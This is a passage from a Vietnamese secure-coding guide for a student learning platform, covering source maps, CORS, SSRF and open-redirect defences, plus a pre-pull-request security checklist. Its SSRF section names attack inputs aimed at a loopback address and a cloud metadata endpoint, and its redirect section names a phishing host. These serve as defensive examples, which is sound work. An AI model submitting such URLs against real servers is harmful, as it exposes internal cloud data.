   ```
3. **Tắt Source Maps của Vue 3 khi Build Production:**
   * Nếu để quên `sourcemap: true` trong `vite.config.js`, bất kỳ ai mở F12 trên trình duyệt cũng có thể xem và tải về toàn bộ mã nguồn gốc `.vue` và `.js` của nhóm!
   * Trong `frontend/vite.config.js`:
     ```javascript
     export default defineConfig({
       build: {
         sourcemap: false, // BẮT BUỘC FALSE trên Production để bảo vệ mã nguồn Frontend
       }
     })
     ```
4. **Cấu hình CORS (Cross-Origin Resource Sharing) nghiêm ngặt:**
   * Tuyệt đối cấm dùng `allow_origins=["*"]` trong FastAPI `CORSMiddleware`. Phải chỉ định rõ danh sách tên miền Frontend được phép gọi API (ví dụ: `["http://localhost:5173", "https://tinhoc.edu.vn"]`).

---

### 8. Phòng chống Lỗ hổng SSRF (Server-Side Request Forgery) & Open Redirect
* **Chống SSRF:** Nếu tính năng nào cho phép người dùng nhập URL hình ảnh minh họa (`imageUrl` hoặc `avatar_url`), **Backend tuyệt đối không tự ý dùng `httpx` hay `requests` để tải URL đó về máy chủ** (vì kẻ tấn công sẽ nhập `http://127.0.0.1:8000/...` hoặc `http://169.254.169.254/latest/meta-data/` để đọc trộm dữ liệu nội bộ của Cloud Server). Chỉ kiểm tra định dạng URL chuỗi thuộc domain CDN hợp lệ (`https://cdn.tinhoc.edu.vn/...`).
* **Chống Open Redirect:** Khi xử lý chuyển hướng sau đăng nhập (`?redirect=/lessons/python-co-ban`), Frontend và Backend bắt buộc kiểm tra đường dẫn `redirect` phải bắt đầu bằng dấu `/` tunggal (ví dụ: `redirect.startsWith('/') && !redirect.startsWith('//')`), ngăn chặn kẻ tấn công lừa học sinh đăng nhập xong bị chuyển hướng sang trang web lừa đảo `https://evil-phishing.com`.

---

## VI. CHECKLIST RÀ SOÁT BẢO MẬT TRƯỚC KHI TẠO PULL REQUEST (SECURITY GATE)

Mỗi thành viên trước khi `git push` và tạo Pull Request bắt buộc tự kiểm tra qua **10 câu hỏi An ninh** sau:

| STT | Hạng mục Kiểm tra Bảo mật | Trạng thái Yêu cầu |
| :---: | :--- | :---: |
| 1 | **BOLA / IDOR Check:** Câu lệnh `SELECT / UPDATE / DELETE` đã có điều kiện `.where(Model.user_id == current_user.id)` chưa? | Bắt buộc |
| 2 | **RBAC Check:** Router đã gắn đúng Dependency phân quyền (`get_current_active_user` hoặc `require_roles([...])`) chưa? | Bắt buộc |
| 3 | **Mass Assignment & Data Leak:** Đã dùng `ConfigDict(extra="forbid")` cho Schema đầu vào và dùng `response_model` để ẩn `password_hash`, `solution_payload`, `grading_snapshot` chưa? | Bắt buộc |
| 4 | **XSS Sanitization:** Mọi trường văn bản người dùng nhập đã chạy qua `clean_html_content()` / `clean_plain_text()` (`nh3`) ở BE và `<SafeMarkdownViewer>` / `<CodeBlock>` ở FE chưa? | Bắt buộc |
| 5 | **SQL Injection:** Có chỗ nào dùng nối chuỗi `f"..."` bên trong `text()` hoặc `order_by()` mà chưa qua Whitelist không? | Bắt buộc $0$ lỗi |
| 6 | **Race Condition:** Các thao tác nộp bài thi, cộng điểm cống hiến, xoay vòng Refresh Token đã dùng Transaction + `.with_for_update()` chưa? | Bắt buộc |
| 7 | **File Upload Security:** API nhận file đã kiểm tra dung lượng $\le 50\text{ MB}$, kiểm tra Magic Bytes (`puremagic`) và đổi tên sang `UUID v4` chưa? | Bắt buộc |
| 8 | **Rate Limiting:** Các API nhạy cảm (Đăng nhập, OTP, Nộp bài, Đăng bài, Tải file) đã gắn bộ giới hạn tốc độ gọi API chưa? | Bắt buộc |
| 9 | **Hardcoded Secrets:** Có vô tình để lộ mật khẩu, JWT Secret, API Key thật trong code hoặc đẩy nhầm file `.env` lên Git không? | Bắt buộc $0$ lỗi |
| 10 | **Audit Logging:** Các hành động nhạy cảm (Đổi quyền, Khóa user, Sửa đáp án câu hỏi, Duyệt tài liệu) đã ghi log vào bảng `audit_logs` chưa? | Bắt buộc |